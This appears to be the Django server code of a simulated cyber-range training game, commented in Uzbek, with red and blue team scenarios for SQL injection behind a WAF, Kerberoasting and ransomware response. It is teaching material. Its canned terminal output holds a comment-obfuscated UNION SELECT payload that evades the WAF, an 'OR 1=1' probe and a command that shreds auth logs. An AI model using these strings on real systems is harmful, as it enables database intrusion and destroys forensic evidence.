"""3D Kiber-poligon (Laboratoriya) server tomoni:
- 3 xil realistik ssenariy: Veb DMZ, Active Directory va Ransomware Favqulodda
- MITRE ATT&CK Matrix integratsiyasi va dinamik sud-tahliliy insident hisoboti (Forensic Report)
- Real vaqtdagi shubha va trace mexanikasi (SOC Active Threat Hunting)
- Har bir o'quvchi va ssenariy uchun alohida dinamik HMAC-SHA256 xavfsiz flaglar
"""
import hashlib
import hmac
import time
import json
from django.conf import settings
from django.http import JsonResponse
from django.views.decorators.csrf import csrf_exempt
from django.views.decorators.http import require_http_methods

CHALLENGE_ID = 51
SESSION_TIME_LIMIT = 300  # 5 daqiqa (soniyalarda)

SCENARIOS = {
    'web': {
        'id': 'web',
        'title': 'Veb DMZ & SQL Injection',
        'network': '10.0.8.0/24 (DMZ Tarmoq)',
        'description': 'Tashqi ModSecurity WAF filtrini aylanib o‘tib, MySQL ma’lumotlar bazasidan maxfiy flagni chiqarish.',
        'red_goal': 'WAF regex filtrini tamper orqali aylanib o‘tib, vault jadvalini buzish.',
        'blue_goal': 'Hujumchi IP-manzilini firewall da to‘sib, veb-serverga virtual patch qo‘llash.',
    },
    'ad': {
        'id': 'ad',
        'title': 'Active Directory & Lateral Movement',
        'network': '172.16.10.0/24 (Korporativ Domen)',
        'description': 'Korporativ tarmoqda Kerberoasting va Pass-the-Hash hujumi orqali Domen Administratori darajasiga ko‘tarilish.',
        'red_goal': 'Kerberos SPN chiptasini olib, Pass-the-Hash orqali Domen Kontrollerini (DC01) qo‘lga olish.',
        'blue_goal': 'Event ID 4769 anomaliyasini aniqlab, zararlangan kompyuterni tarmoqdan uzish va krbtgt hisobini himoyalash.',
    },
    'ransomware': {
        'id': 'ransomware',
        'title': 'Ransomware Favqulodda Holat',
        'network': '192.168.40.0/24 (Fayl Serverlari)',
        'description': 'Tarmoqda shifrlash tarqalayotgan favqulodda vaziyatda tezkor javob choralari va xotiradan kalitni tiklash.',
        'red_goal': 'Zaxira nusxalarni (VSS) o‘chirib, ulashilgan papkalarni shifrlash va to‘lov talabnomasini qo‘yish.',
        'blue_goal': 'Kripto-jarayonni to‘xtatish, RAM xotirasidan xususiy shifrlash kalitini topish va fayllarni tiklash.',
    },
}

MITRE_DB = {
    'T1046': {'id': 'T1046', 'name': 'Network Service Discovery', 'tactic': 'Reconnaissance'},
    'T1592': {'id': 'T1592', 'name': 'Gather Victim Host Information', 'tactic': 'Reconnaissance'},
    'T1018': {'id': 'T1018', 'name': 'Remote System Discovery', 'tactic': 'Discovery'},
    'T1087': {'id': 'T1087', 'name': 'Account Discovery: Domain Account', 'tactic': 'Discovery'},
    'T1190': {'id': 'T1190', 'name': 'Exploit Public-Facing Application', 'tactic': 'Initial Access'},
    'T1105': {'id': 'T1105', 'name': 'Ingress Tool Transfer (Payload Drop)', 'tactic': 'Command and Control'},
    'T1027': {'id': 'T1027', 'name': 'Obfuscated/Argument Encoding', 'tactic': 'Defense Evasion'},
    'T1070': {'id': 'T1070', 'name': 'Indicator Removal on Host (Anti-forensics)', 'tactic': 'Defense Evasion'},
    'T1558.003': {'id': 'T1558.003', 'name': 'Kerberoasting (TGS Request)', 'tactic': 'Credential Access'},
    'T1550.002': {'id': 'T1550.002', 'name': 'Pass the Hash (NTLM Relay)', 'tactic': 'Lateral Movement'},
    'T1078': {'id': 'T1078', 'name': 'Valid Accounts: Domain Admin Escalation', 'tactic': 'Privilege Escalation'},
    'T1490': {'id': 'T1490', 'name': 'Inhibit System Recovery (VSS Delete)', 'tactic': 'Impact'},
    'T1486': {'id': 'T1486', 'name': 'Data Encrypted for Impact', 'tactic': 'Impact'},
    'T1498': {'id': 'T1498', 'name': 'Network Denial of Service', 'tactic': 'Impact'},
    'T1059': {'id': 'T1059', 'name': 'Command and Scripting Interpreter', 'tactic': 'Execution'},
    'T1005': {'id': 'T1005', 'name': 'Data from Local System', 'tactic': 'Collection'},
    'T1041': {'id': 'T1041', 'name': 'Exfiltration Over C2 Channel', 'tactic': 'Exfiltration'},
    'T1562': {'id': 'T1562', 'name': 'Host Isolation & Perimeter Filtering', 'tactic': 'Containment'},
    'T1565': {'id': 'T1565', 'name': 'Virtual Patching & Integrity Restoration', 'tactic': 'Recovery'},
    'T1005_B': {'id': 'T1005_B', 'name': 'SIEM Audit Event Ingestion', 'tactic': 'Detection'},
    'T1082': {'id': 'T1082', 'name': 'Threat Triangulation & Forensics', 'tactic': 'Investigation'},
}

def get_session_seed(request):
    """Foydalanuvchi yoki sessiya uchun unikal identifikator"""
    if hasattr(request, 'user') and request.user and request.user.is_authenticated:
        return f"user:{request.user.id}:{request.user.username}"
    if hasattr(request, 'session') and request.session:
        if not request.session.session_key:
            request.session.create()
        return f"sess:{request.session.session_key}"
    return "guest:anonymous"

def get_dynamic_lab_flag(request, mode='red', scenario='web', challenge_id=CHALLENGE_ID):
    """Har o'quvchi va ssenariy uchun yagona xavfsiz flag yaratish"""
    if isinstance(scenario, int):
        challenge_id = scenario
        scenario = 'web'
    seed = get_session_seed(request)
    sc = scenario if scenario in SCENARIOS else 'web'
    raw = f"3d_lab:{sc}:{mode}:{challenge_id}:{seed}:{settings.SECRET_KEY}"
    token = hmac.new(settings.SECRET_KEY.encode(), raw.encode(), hashlib.sha256).hexdigest()[:12].upper()
    return f"WanNet{{3D_{sc.upper()}_{mode.upper()}_{token}}}"

def get_initial_lab_state(mode='red', scenario='web'):
    if scenario not in SCENARIOS:
        scenario = 'web'
    now = time.time()
    return {
        'scenario': scenario,
        'mode': mode,
        'threat': 0,           # 0 - 100% (Shubha darajasi)
        'trace': 0,            # 0 - 100% (SOC triangulation / qidiruv)
        'is_blocked': False,   # 100% ga yetsa bloklanadi
        'block_reason': None,
        'alerts': [],          # IDS/SIEM ogohlantirishlari
        'mitre_log': [],       # Ishlatilgan MITRE texnikalari
        'forensic_report': None,
        'start_time': now,
        'total_time': SESSION_TIME_LIMIT,
        # Red Team holati
        'red': {
            'scanned': False,
            'scan_count': 0,
            'token_acquired': False,
            'token_val': None,
            'waf_tested': False,
            'waf_test_count': 0,
            'waf_bypassed': False,
            'exploited': False,
            'flag': None,
        },
        # Blue Team holati
        'blue': {
            'logs_viewed': False,
            'target_identified': False,
            'ip_blocked': False,
            'patched': False,
            'verified': False,
            'flag': None,
        },
    }

def get_time_remaining(state):
    start = state.get('start_time', time.time())
    total = state.get('total_time', SESSION_TIME_LIMIT)
    elapsed = time.time() - start
    return max(0, int(total - elapsed))

def log_mitre(state, tech_id):
    """MITRE ATT&CK texnikasini ro'yxatga qo'shish"""
    info = MITRE_DB.get(tech_id)
    if not info:
        return
    state.setdefault('mitre_log', [])
    if not any(m['id'] == tech_id for m in state['mitre_log']):
        state['mitre_log'].append(info)

def generate_forensic_report(state):
    """Insident tahlili va sud-kiber-ekspertiza hisoboti (Post-Incident Debriefing)"""
    threat = state.get('threat', 0)
    trace = state.get('trace', 0)
    elapsed = int(time.time() - state.get('start_time', time.time()))
    minutes, seconds = divmod(elapsed, 60)
    time_taken_str = f"{minutes:02d}m {seconds:02d}s"
    
    is_solved = bool((state['mode'] == 'red' and state['red'].get('flag')) or (state['mode'] == 'blue' and state['blue'].get('flag')))
    is_blocked = state.get('is_blocked', False)
    
    max_heat = max(threat, trace)
    stealth_score = max(5, 100 - max_heat) if is_solved else 0
    
    if is_blocked:
        grade = 'F'
        verdict = 'Fosh etildi va tarmoqdan uzildi (Mission Failed)'
    elif stealth_score >= 85 and elapsed <= 180:
        grade = 'S'
        verdict = 'Elita darajadagi arvoh operatsiya (Ghost Operative)'
    elif stealth_score >= 60:
        grade = 'A'
        verdict = 'Yuqori professional darajadagi kiber-amaliyot'
    elif stealth_score >= 40:
        grade = 'B'
        verdict = 'Qoniqarli, ammo himoyachida jiddiy shubha uyg‘otildi'
    else:
        grade = 'C'
        verdict = 'Hujum deyarli barbod bo‘layozdi, yuqori shovqin'
        
    mitre_list = state.get('mitre_log', [])
    tactics = list(set([m.get('tactic') for m in mitre_list if m.get('tactic')]))
    
    return {
        'scenario': state.get('scenario', 'web'),
        'scenario_title': SCENARIOS.get(state.get('scenario', 'web'), {}).get('title', 'Kiber-Poligon'),
        'mode': state.get('mode', 'red'),
        'grade': grade,
        'verdict': verdict,
        'stealth_score': stealth_score,
        'time_taken': time_taken_str,
        'threat_peak': threat,
        'trace_peak': trace,
        'alerts_triggered': len(state.get('alerts', [])),
        'mitre_techniques': mitre_list,
        'tactics_covered': tactics,
        'completed_at': time.strftime('%Y-%m-%d %H:%M:%S UTC'),
    }

def check_session_timeout(state):
    """Vaqt tugaganligini tekshirish"""
    if state.get('is_blocked'):
        return False
    is_solved = (state.get('mode') == 'red' and state.get('red', {}).get('flag')) or (state.get('mode') == 'blue' and state.get('blue', {}).get('flag'))
    if is_solved:
        return False
        
    rem = get_time_remaining(state)
    if rem <= 0:
        state['is_blocked'] = True
        state['threat'] = 100
        state['trace'] = 100
        if state.get('mode') == 'red':
            state['block_reason'] = "⏰ VAQT TUGADI! SOC Navbatchi tahlilchilari anomaliyalarni solishtirib chiqdi. Hujumchi IP triangulatsiya qilinib, tarmoqdan uzildi!"
            alert = {
                'timestamp': time.strftime('%H:%M:%S'),
                'threat': 100,
                'trace': 100,
                'rule_id': 'SOC-TIMEOUT-LOCK',
                'rule_name': 'Incident Response Window Expired',
                'reason': "5 daqiqalik navbatchilik vaqti tugadi. SOC tahlilchilari tajovuzkor manzilini triangulatsiya qildi.",
            }
        else:
            state['block_reason'] = "⏰ VAQT TUGADI! Tajovuzkor botnet asosiy ma'lumotlar bazasini sizdirishga ulgurdi (Data Breach). Tizim buzildi."
            alert = {
                'timestamp': time.strftime('%H:%M:%S'),
                'threat': 100,
                'trace': 100,
                'rule_id': 'BOTNET-EXFIL-COMPLETE',
                'rule_name': 'Database Exfiltration Succeeded',
                'reason': "Himoyachi server o'z vaqtida chora ko'rmadi, ma'lumotlar bazasi sizdirildi.",
            }
        state.setdefault('alerts', []).append(alert)
        state['forensic_report'] = generate_forensic_report(state)
        return True
    return False

def get_or_create_state(request):
    state = request.session.get('lab3d_state')
    if not state or not isinstance(state, dict) or 'threat' not in state or 'scenario' not in state:
        state = get_initial_lab_state('red', 'web')
        request.session['lab3d_state'] = state
    return state

def save_state(request, state):
    request.session['lab3d_state'] = state
    request.session.modified = True

def add_threat(state, amount, rule_id, rule_name, reason, mitre_id=None):
    """Shubha darajasi va SOC trace ni oshirish"""
    state['threat'] = min(100, state.get('threat', 0) + amount)
    trace_inc = int(amount * 1.15)
    state['trace'] = min(100, state.get('trace', 0) + trace_inc)
    
    if mitre_id:
        log_mitre(state, mitre_id)
    
    alert = {
        'timestamp': time.strftime('%H:%M:%S'),
        'threat': state['threat'],
        'trace': state['trace'],
        'rule_id': rule_id,
        'rule_name': rule_name,
        'reason': reason,
        'mitre_id': mitre_id,
    }
    state.setdefault('alerts', []).append(alert)
    if len(state['alerts']) > 15:
        state['alerts'] = state['alerts'][-15:]
        
    if (state['threat'] >= 100 or state['trace'] >= 100) and not state.get('is_blocked'):
        state['is_blocked'] = True
        state['block_reason'] = f"🚨 HIMOYACHI SERVER SIZNI TOPDI! IDS/SIEM qoidasi [{rule_id}] ishga tushdi va SOC sizning IP-manzilingizni aniqlab, firewall orqali blokladi!"
        state['forensic_report'] = generate_forensic_report(state)
    return alert

@csrf_exempt
@require_http_methods(["GET", "POST"])
def lab3d_api_dispatch(request):
    """Boshqaruvchi API: /api/lab3d/"""
    action = request.GET.get('action') or ('state' if request.method == 'GET' else '')
    if request.method == 'POST':
        try:
            body = json.loads(request.body.decode('utf-8')) if request.body else {}
        except:
            body = {}
        action = body.get('action') or action
    else:
        body = {}

    state = get_or_create_state(request)
    timed_out = check_session_timeout(state)
    if timed_out:
        save_state(request, state)
        return JsonResponse({
            'ok': False,
            'blocked': True,
            'attack': 'counter_block',
            'focus': 'attacker',
            'camera': 'attacker',
            'state': sanitize_state(state),
            'lines': [
                {'type': 'danger', 'text': f"[-] {state['block_reason']}"},
                {'type': 'warn', 'text': "[*] Tizimni qaytadan boshlash uchun 'reset' buyrug'ini bering."},
            ]
        })

    if action in ('state', 'tick'):
        return JsonResponse({'ok': True, 'state': sanitize_state(state)})

    elif action == 'switch_scenario':
        target_sc = body.get('scenario') or 'web'
        if target_sc not in SCENARIOS:
            target_sc = 'web'
        mode = state.get('mode', 'red')
        state = get_initial_lab_state(mode, target_sc)
        save_state(request, state)
        return JsonResponse({
            'ok': True,
            'state': sanitize_state(state),
            'message': f"Ssenariy almashtirildi: {SCENARIOS[target_sc]['title']}.",
        })

    elif action == 'reset':
        mode = body.get('mode') or state.get('mode', 'red')
        scenario = body.get('scenario') or state.get('scenario', 'web')
        state = get_initial_lab_state(mode, scenario)
        save_state(request, state)
        return JsonResponse({
            'ok': True,
            'state': sanitize_state(state),
            'message': f"Laboratoriya qayta tiklandi: {SCENARIOS.get(scenario, {}).get('title', 'Veb')}. Shubha: 0%.",
        })

    elif action == 'switch_mode':
        target_mode = body.get('mode')
        if target_mode not in ('red', 'blue'):
            target_mode = 'blue' if state.get('mode') == 'red' else 'red'
        scenario = state.get('scenario', 'web')
        state = get_initial_lab_state(target_mode, scenario)
        save_state(request, state)
        return JsonResponse({
            'ok': True,
            'state': sanitize_state(state),
            'message': f"Rejim almashtirildi: {'🔵 Moviy jamoa (Himoyachi)' if target_mode == 'blue' else '🔴 Qizil jamoa (Hujumchi)'}.",
        })

    elif action == 'command':
        cmd_raw = (body.get('command') or '').strip()
        result = handle_command(request, state, cmd_raw)
        save_state(request, state)
        result['state'] = sanitize_state(state)
        return JsonResponse(result)

    return JsonResponse({'ok': False, 'error': f"Noma'lum amal: {action}"}, status=400)

def sanitize_state(state):
    """Mijozga holatni taqdim etish"""
    return {
        'scenario': state.get('scenario', 'web'),
        'scenarios': list(SCENARIOS.values()),
        'mode': state.get('mode', 'red'),
        'threat': state.get('threat', 0),
        'trace': state.get('trace', 0),
        'time_remaining': get_time_remaining(state),
        'total_time': state.get('total_time', SESSION_TIME_LIMIT),
        'is_blocked': state.get('is_blocked', False),
        'block_reason': state.get('block_reason'),
        'alerts': state.get('alerts', []),
        'mitre_log': state.get('mitre_log', []),
        'forensic_report': state.get('forensic_report'),
        'red': state.get('red', {}),
        'blue': state.get('blue', {}),
    }

def handle_command(request, state, text):
    """Server tomonida buyruqni qayta ishlash (ko'p ssenariyli)"""
    parts = text.lower().split()
    if not parts:
        return {'ok': True, 'lines': []}
        
    action = parts[0]
    arg1 = parts[1] if len(parts) > 1 else ''
    arg2 = parts[2] if len(parts) > 2 else ''

    # Vaqt tekshiruvi (agar reset bo'lmasa)
    if action not in ('reset', 'help', 'status', 'mode', 'scenarios', 'scenario'):
        if check_session_timeout(state):
            return {
                'ok': False,
                'blocked': True,
                'attack': 'counter_block',
                'focus': 'attacker',
                'camera': 'attacker',
                'lines': [
                    {'type': 'danger', 'text': f"[-] {state['block_reason']}"},
                    {'type': 'warn', 'text': "[*] Tizimni qaytadan boshlash uchun 'reset' buyrug'ini yuboring."},
                ]
            }

    # Agar bloklangan bo'lsa va buyruq 'reset' bo'lmasa
    if state.get('is_blocked') and action not in ('reset', 'help', 'status', 'mode', 'scenarios', 'scenario', 'report', 'forensics'):
        return {
            'ok': False,
            'blocked': True,
            'attack': 'counter_block',
            'focus': 'attacker',
            'camera': 'attacker',
            'lines': [
                {'type': 'danger', 'text': f"[-] BLOKLANDI! {state['block_reason']}"},
                {'type': 'warn', 'text': "[*] Tizimni qaytadan boshlash uchun 'reset' buyrug'ini yuboring."},
            ]
        }

    scenario = state.get('scenario', 'web')
    mode = state.get('mode', 'red')
    sc_info = SCENARIOS.get(scenario, SCENARIOS['web'])

    # ===================== UMUMIY VA METADATA BUYRUQLARI =====================
    if action in ('scenarios', 'scenario'):
        if arg1 in SCENARIOS:
            state.clear()
            state.update(get_initial_lab_state(mode, arg1))
            return {
                'ok': True,
                'lines': [
                    {'type': 'success', 'text': f"[+] Ssenariy o‘zgartirildi: {SCENARIOS[arg1]['title']}"},
                    {'type': 'info', 'text': f"    Tarmoq: {SCENARIOS[arg1]['network']}"},
                    {'type': 'info', 'text': f"    Tavsif: {SCENARIOS[arg1]['description']}"},
                ]
            }
        return {
            'ok': True,
            'lines': [
                {'type': 'info', 'text': "=== 🌐 MAVJUD KIBER-POLIGON SSENARIYLARI ==="},
                {'type': 'info', 'text': "  1. scenario web          Veb DMZ & SQL Injection (ModSecurity WAF)"},
                {'type': 'info', 'text': "  2. scenario ad           Active Directory & Lateral Movement (Kerberoast)"},
                {'type': 'info', 'text': "  3. scenario ransomware   Ransomware Favqulodda & RAM kalit tiklash"},
                {'type': 'warn', 'text': f"[*] Joriy faol ssenariy: '{scenario}' ({sc_info['title']})"},
            ]
        }

    if action == 'help':
        lines = [
            {'type': 'info', 'text': f"=== 🌐 SSENARIY: {sc_info['title']} [{sc_info['network']}] ==="},
            {'type': 'info', 'text': f"Vazifa: {sc_info['red_goal'] if mode == 'red' else sc_info['blue_goal']}"},
            {'type': 'info', 'text': "--------------------------------------------------------"},
        ]
        if mode == 'red':
            lines.append({'type': 'info', 'text': "--- 🔴 QIZIL JAMOA (HUJUMCHI) BUYRUQLARI ---"})
            if scenario == 'web':
                lines.extend([
                    {'type': 'info', 'text': "  scan, nmap             tarmoqni skanerlash (SYN scan)"},
                    {'type': 'info', 'text': "  recon, token           /api/v1/telemetry dan so'rov tokenini olish"},
                    {'type': 'info', 'text': "  waf test               oddiy SQLi yuborib WAF filtrini aniqlash"},
                    {'type': 'info', 'text': "  waf bypass             WAF regex qoidasini chetlab o'tuvchi tamper"},
                    {'type': 'info', 'text': "  stealth, clean         izlarni tozalash (SOC Trace va shubhani pasaytiradi)"},
                    {'type': 'info', 'text': "  exploit                veb-server orqali bazadan flagni chiqarish"},
                ])
            elif scenario == 'ad':
                lines.extend([
                    {'type': 'info', 'text': "  scan ad, net view      AD korporativ tarmog'ini skanerlash"},
                    {'type': 'info', 'text': "  bloodhound             Domen ob'ektlari va ishonch munosabatlarini tahlil qilish"},
                    {'type': 'info', 'text': "  kerberoast             SPN xizmat hisoblari TGS chiptalarini tutish"},
                    {'type': 'info', 'text': "  pass-the-hash          NTLM hash orqali DC ga autentifikatsiya qilish"},
                    {'type': 'info', 'text': "  stealth, clean         Kerberos chiptalar izlarini tozalash"},
                    {'type': 'info', 'text': "  domain-admin, exploit  Domen Administrator huquqi va NTDS.dit bayrog'i"},
                ])
            else: # ransomware
                lines.extend([
                    {'type': 'info', 'text': "  scan                   fayl serverlari va omborni skanerlash"},
                    {'type': 'info', 'text': "  drop payload           shifrlash agentini (crypt_agent.exe) yuklash"},
                    {'type': 'info', 'text': "  disable-vss            zaxira nusxalarini (Shadow Copies) o'chirish"},
                    {'type': 'info', 'text': "  encrypt-shares         ulashilgan tarmoq papkalarini AES bilan shifrlash"},
                    {'type': 'info', 'text': "  stealth, clean         C2 beaconing izlarini yashirish"},
                    {'type': 'info', 'text': "  ransom-note, exploit   to'lov talabnomasi va eksfiltratsiya bayrog'i"},
                ])
            lines.extend([
                {'type': 'info', 'text': "  intel                  AI kiber-razvedka brifingi"},
                {'type': 'info', 'text': "  mode blue              himoyachi roliga o'tish"},
                {'type': 'info', 'text': "  reset                  sessiyani tozalash"},
            ])
        else:
            lines.append({'type': 'info', 'text': "--- 🔵 MOVIY JAMOA (HIMOYACHI) BUYRUQLARI ---"})
            if scenario == 'web':
                lines.extend([
                    {'type': 'info', 'text': "  soc logs               kiruvchi xom tarmoq loglarini ko'rish"},
                    {'type': 'info', 'text': "  investigate <IP>       shubhali IP manzil faoliyatini tahlil qilish"},
                    {'type': 'info', 'text': "  block <IP>             tajovuzkor IP manzilni firewall da bloklash"},
                    {'type': 'info', 'text': "  patch sql              veb-server zaifligiga virtual patch qo'llash"},
                    {'type': 'info', 'text': "  verify                 himoyalanganlikni tasdiqlash va flag olish"},
                ])
            elif scenario == 'ad':
                lines.extend([
                    {'type': 'info', 'text': "  ad logs                Event ID 4769 va Kerberos auditi loglari"},
                    {'type': 'info', 'text': "  investigate <IP>       zararlangan ishchi kompyuterni tahlil qilish"},
                    {'type': 'info', 'text': "  isolate-pc <IP>        kompyuterni korporativ VLAN dan uzish"},
                    {'type': 'info', 'text': "  reset-krbtgt           KRBTGT hisob parolini 2 marta yangilash"},
                    {'type': 'info', 'text': "  verify                 domen butunligini tasdiqlash va flag olish"},
                ])
            else: # ransomware
                lines.extend([
                    {'type': 'info', 'text': "  hunt-beacon            C2 ulanishlarini va zararli oqimni aniqlash"},
                    {'type': 'info', 'text': "  kill-process <exe>     kripto-jarayonni favqulodda to'xtatish"},
                    {'type': 'info', 'text': "  vss-restore            xavfsiz snapshot lardan ma'lumotlarni tiklash"},
                    {'type': 'info', 'text': "  extract-key            RAM xotirasidan xususiy shifrlash kalitini topish"},
                    {'type': 'info', 'text': "  verify                 fayllarni to'liq tiklash va flag olish"},
                ])
            lines.extend([
                {'type': 'info', 'text': "  intel                  himoyachi taktik brifingi"},
                {'type': 'info', 'text': "  mode red               hujumchi roliga o'tish"},
                {'type': 'info', 'text': "  reset                  sessiyani tozalash"},
            ])
        return {'ok': True, 'lines': lines}

    if action == 'status':
        rem = get_time_remaining(state)
        minutes, seconds = divmod(rem, 60)
        mitre_count = len(state.get('mitre_log', []))
        return {
            'ok': True,
            'lines': [
                {'type': 'info', 'text': f"Ssenariy: '{scenario}' ({sc_info['title']}) · Tarmoq: {sc_info['network']}"},
                {'type': 'info', 'text': f"Rol: {'🔴 Red Team' if mode == 'red' else '🔵 Blue Team'} · Shubha: {state.get('threat', 0)}% · SOC Trace: {state.get('trace', 0)}%"},
                {'type': 'info', 'text': f"Qolgan vaqt: {minutes:02d}:{seconds:02d} · MITRE texnikalari: {mitre_count} ta"},
            ]
        }

    if action == 'intel':
        if scenario == 'web':
            text_intel = "Nginx 1.18 oldida ModSecurity v3 WAF mavjud. SQL kalit so'zlari (UNION, SELECT) inline izohlar (/**/) bilan parchalanmasa, filtr so'rovni to'xtatadi."
        elif scenario == 'ad':
            text_intel = "Domen Kontrolleri: WIN-DC01 (172.16.10.5). Xizmat hisobi 'svc_sql' zaif RC4-HMAC shifriga ega, Kerberoast hujumiga moyil."
        else:
            text_intel = "Ransomware C2 serveri 192.168.40.100 da faol. RSA kaliti shifrlash tugaguniga qadar jarayon xotirasida (RAM heap) saqlanib turadi."
        return {
            'ok': True,
            'lines': [
                {'type': 'info', 'text': f"=== 🕵️ KIBER-RAZVEDKA BRIFINGI ({sc_info['title']}) ==="},
                {'type': 'warn', 'text': f"[*] Razvedka ma'lumoti: {text_intel}"},
            ]
        }

    if action in ('report', 'forensics'):
        rep = generate_forensic_report(state)
        state['forensic_report'] = rep
        return {
            'ok': True,
            'lines': [
                {'type': 'info', 'text': f"=== 📑 SUD-KIBER-EKSPERTIZA HISOBOTI (Baho: {rep['grade']}) ==="},
                {'type': 'success', 'text': f"Hukm: {rep['verdict']}"},
                {'type': 'info', 'text': f"Yashirinlik (Stealth Score): {rep['stealth_score']}% · Sarflangan vaqt: {rep['time_taken']}"},
                {'type': 'info', 'text': f"Maksimal shubha: {rep['threat_peak']}% · SOC Trace: {rep['trace_peak']}%"},
                {'type': 'info', 'text': f"Qamrab olingan MITRE taktikalari: {', '.join(rep['tactics_covered']) or 'Boshlanmadi'}"},
            ]
        }

    if action == 'mode':
        target = arg1 if arg1 in ('red', 'blue') else ('blue' if mode == 'red' else 'red')
        state.clear()
        state.update(get_initial_lab_state(target, scenario))
        return {
            'ok': True,
            'lines': [{'type': 'success', 'text': f"[+] Rejim almashtirildi: {'🔵 Moviy jamoa (Himoyachi)' if target == 'blue' else '🔴 Qizil jamoa (Hujumchi)'}"}]
        }

    if action == 'reset':
        state.clear()
        state.update(get_initial_lab_state(mode, scenario))
        return {
            'ok': True,
            'lines': [
                {'type': 'success', 'text': f"[+] Sessiya to'liq qayta tiklandi: {sc_info['title']}."},
                {'type': 'info', 'text': "[*] Shubha: 0%, Trace: 0%, Vaqt: 05:00 yangilandi."},
            ]
        }

    # Umumiy Stealth buyrug'i (barcha ssenariylar uchun)
    if action in ('stealth', 'clean', 'evade', 'clearlogs'):
        log_mitre(state, 'T1070')
        old_trace = state.get('trace', 0)
        old_threat = state.get('threat', 0)
        state['trace'] = max(0, old_trace - 30)
        state['threat'] = max(0, old_threat - 20)
        return {
            'ok': True,
            'attack': 'mitigate',
            'focus': 'attacker',
            'lines': [
                {'type': 'cmd', 'text': "operator@kali:~$ proxychains --rotate && shred -u /var/log/auth.log"},
                {'type': 'success', 'text': "[+] Anti-forensics (MITRE T1070): Proxy zanjiri yangilandi, tarmoq izlari tozalab chiqildi."},
                {'type': 'info', 'text': f"[*] SOC Trace: {old_trace}% → {state['trace']}% (-30%)"},
                {'type': 'info', 'text': f"[*] Shubha darajasi: {old_threat}% → {state['threat']}% (-20%)"},
                {'type': 'success', 'text': "[+] Himoyachi serverning sizni topish xavfi pasaytirildi!"},
            ]
        }

    # ===================== RED TEAM BUYRUQLARI =====================
    if mode == 'red':
        red = state['red']

        # ---------- 1. WEB SSENARIYSI ----------
        if scenario == 'web':
            if action in ('scan', 'nmap'):
                scan_count = red.get('scan_count', 0)
                red['scan_count'] = scan_count + 1
                red['scanned'] = True
                log_mitre(state, 'T1046')

                if scan_count >= 1:
                    alert = add_threat(state, 35, 'SURICATA-2001288', 'ET SCAN Aggressive Rapid Port Sweep', "10.0.8.0/24 ga takroriy port skaneri.", 'T1046')
                    if state.get('is_blocked'):
                        return {'ok': False, 'blocked': True, 'attack': 'counter_block', 'focus': 'attacker', 'lines': [{'type': 'danger', 'text': f"[-] {state['block_reason']}"}]}
                    return {'ok': True, 'attack': 'scan', 'focus': 'web', 'lines': [{'type': 'danger', 'text': "[!] Takroriy skanerlash SOC monitoringi e'tiborini tortdi! (+35% shubha)"}]}

                alert = add_threat(state, 15, 'SURICATA-2000537', 'ET SCAN Potential Nmap SYN Port Sweep', "10.0.8.0/24 tarmog'idagi barcha portlarga SYN paketlar yuborildi.", 'T1046')
                return {
                    'ok': True,
                    'attack': 'scan',
                    'focus': 'web',
                    'lines': [
                        {'type': 'cmd', 'text': "operator@kali:~$ nmap -sS -sV 10.0.8.0/24"},
                        {'type': 'success', 'text': "[+] 4 ta faol tugun: 10.0.8.1 (Router), 10.0.8.5 (WAF), 10.0.8.10 (Web DMZ), 10.0.8.50 (MySQL)"},
                        {'type': 'warn', 'text': f"[!] IDS/SIEM: {alert['rule_id']} ishladi! (MITRE T1046) · Shubha: {state['threat']}%"},
                        {'type': 'info', 'text': "[*] Keyingi qadam: Veb-serverdagi '/api/v1/telemetry' ni tekshiring ('recon')."},
                    ]
                }

            elif action in ('recon', 'token', 'curl'):
                if not red['scanned']:
                    return {'ok': False, 'lines': [{'type': 'warn', 'text': "[!] Avval tarmoqni skanerlang: 'scan'."}]}
                red['token_acquired'] = True
                red['token_val'] = f"REQ_TOKEN_{hashlib.sha256(f'tok:{get_session_seed(request)}'.encode()).hexdigest()[:8].upper()}"
                add_threat(state, 10, 'AUDIT-082', 'Unauthenticated Probe to Telemetry API', "/api/v1/telemetry dan token olindi.", 'T1592')
                return {
                    'ok': True,
                    'focus': 'web',
                    'lines': [
                        {'type': 'cmd', 'text': "operator@kali:~$ curl -i http://10.0.8.10:8080/api/v1/telemetry"},
                        {'type': 'success', 'text': f"HTTP/1.1 200 OK · X-Telemetry-Token: {red['token_val']}"},
                        {'type': 'info', 'text': '{"endpoint": "/api/v1/search?q=", "vulnerable_param": "q"}'},
                        {'type': 'warn', 'text': "[*] Endi WAF filtrini sinash uchun 'waf test' deb yozing."},
                    ]
                }

            elif action == 'waf':
                if arg1 == 'bypass':
                    if not red['waf_tested']:
                        return {'ok': False, 'lines': [{'type': 'warn', 'text': "[!] Avval filtrni o'rganing: 'waf test'."}]}
                    red['waf_bypassed'] = True
                    add_threat(state, 5, 'MODSEC-INSPECT', 'WAF Filter Evasion Pattern', "Inline izohlar (/**/) orqali aylanib o'tildi.", 'T1027')
                    return {
                        'ok': True,
                        'focus': 'waf',
                        'lines': [
                            {'type': 'cmd', 'text': f"operator@kali:~$ waf bypass --token {red.get('token_val') or 'REQ'}"},
                            {'type': 'success', 'text': "    Payload: q=1'/**/UnIoN/**/SeLeCt/**/1,secret/**/FROM/**/vault#"},
                            {'type': 'success', 'text': "[+] WAF qoidasi chetlab o'tildi (HTTP 200 OK)! (MITRE T1027)"},
                            {'type': 'warn', 'text': "[*] Endi ma'lumotlar bazasidan flagni oling: 'exploit'."},
                        ]
                    }
                else:
                    if not red['token_acquired']:
                        return {'ok': False, 'lines': [{'type': 'warn', 'text': "[!] Avval token oling: 'recon'."}]}
                    waf_count = red.get('waf_test_count', 0)
                    red['waf_test_count'] = waf_count + 1
                    red['waf_tested'] = True
                    alert = add_threat(state, 35 if waf_count >= 1 else 25, 'MODSEC-942100', 'SQLi Detected by WAF', "libinjection orqali SQLi to'xtatildi.", 'T1190')
                    if state.get('is_blocked'):
                        return {'ok': False, 'blocked': True, 'attack': 'counter_block', 'focus': 'attacker', 'lines': [{'type': 'danger', 'text': f"[-] {state['block_reason']}"}]}
                    return {
                        'ok': True,
                        'attack': 'waf_block',
                        'focus': 'waf',
                        'lines': [
                            {'type': 'cmd', 'text': "operator@kali:~$ curl -i 'http://10.0.8.10:8080/api/v1/search?q=%27+OR+1%3D1+--'"},
                            {'type': 'danger', 'text': "[-] HTTP/1.1 403 Forbidden (ModSecurity WAF) (MITRE T1190)"},
                            {'type': 'warn', 'text': f"[!] Shubha darajasi: +25% (Jami: {state['threat']}%, Trace: {state['trace']}%)"},
